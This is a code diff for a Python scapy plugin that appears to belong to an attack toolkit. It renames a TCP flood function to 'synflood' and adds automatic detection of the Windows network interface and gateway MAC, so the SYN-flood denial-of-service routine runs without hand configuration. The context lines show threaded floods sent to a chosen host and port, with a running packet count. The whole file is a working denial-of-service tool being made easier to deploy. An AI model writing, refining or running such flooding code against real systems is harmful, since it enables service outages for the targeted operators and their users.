@@ -1,8 +1,9 @@
 from plugins.common import *
-from scapy.all import IP, TCP, sendp, sendpfast, RandShort, RandIP, conf, Ether
+from scapy.all import IP, TCP, sendp, RandShort, RandIP, conf, Ether, get_if_list, get_if_hwaddr
 import threading
 import time
 import subprocess
+import socket
 
 conf.verb = 0
 
@@ -14,7 +15,52 @@ def get_gateway():
             return parts[2]
     return None
 
-def tcpflood(server, threads):
+def get_active_iface():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+
+        result = subprocess.run('ipconfig', shell=True, capture_output=True, text=True)
+        lines = result.stdout.splitlines()
+
+        adapter_name = None
+        for i, line in enumerate(lines):
+            if 'adapter' in line.lower():
+                adapter_name = line.strip().rstrip(':')
+            if local_ip in line:
+                break
+
+        # map adapter name -> NPF GUID
+        getmac = subprocess.run('getmac /v /fo csv', shell=True, capture_output=True, text=True)
+        for line in getmac.stdout.splitlines()[1:]:
+            parts = [p.strip('"') for p in line.split('","')]
+            if len(parts) >= 4 and adapter_name and parts[0] in adapter_name:
+                guid = parts[3].replace('\\Device\\Tcpip_', '')
+                return f'\\Device\\NPF_{guid}', local_ip
+
+        # fallback — scan all interfaces
+        for iface in get_if_list():
+            if 'NPF_Loopback' in iface:
+                continue
+            return iface, local_ip
+
+    except Exception as e:
+        return None, None
+
+def get_gw_mac(gw):
+    subprocess.run(f'ping {gw} -n 1', shell=True, capture_output=True)
+    result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
+    for line in result.stdout.splitlines():
+        if gw in line:
+            parts = line.split()
+            for p in parts:
+                if '-' in p and len(p) == 17:
+                    return p.replace('-', ':')
+    return None
+
+def synflood(server, threads):
     try:
         if ':' in server:
             host, port = server.split(':')
@@ -33,34 +79,18 @@ def tcpflood(server, threads):
             return
         logging.info(f'Gateway: {gw}')
 
-        iface = '\\Device\\NPF_{083600BE-B1CF-4E2C-B93E-CA2F1FB3725A}'
+        iface, local_ip = get_active_iface()
+        if not iface:
+            logging.error('Cannot detect active interface')
+            return
+        logging.info(f'Interface: {iface}')
+        logging.info(f'Local IP: {local_ip}')
         conf.iface = iface
 
-        result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
-        gw_mac = None
-        for line in result.stdout.splitlines():
-            if gw in line:
-                parts = line.split()
-                for p in parts:
-                    if '-' in p and len(p) == 17:
-                        gw_mac = p.replace('-', ':')
-                        break
-
-        if not gw_mac:
-            subprocess.run(f'ping {gw} -n 1', shell=True, capture_output=True)
-            result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
-            for line in result.stdout.splitlines():
-                if gw in line:
-                    parts = line.split()
-                    for p in parts:
-                        if '-' in p and len(p) == 17:
-                            gw_mac = p.replace('-', ':')
-                            break
-
+        gw_mac = get_gw_mac(gw)
         if not gw_mac:
             logging.error('Cannot find gateway MAC')
             return
-
         logging.info(f'Gateway MAC: {gw_mac}')
         logging.info('Building SYN packet pool...')
 
@@ -85,7 +115,6 @@ def tcpflood(server, threads):
                 except:
                     pass
 
-        # stats thread แยกต่างหาก
         def stats():
             prev = 0
             while not stop.is_set():
@@ -100,7 +129,6 @@ def tcpflood(server, threads):
         for t in pool:
             t.start()
 
-        # main thread รอ ctrl+c
         while not stop.is_set():
             time.sleep(0.1)
 
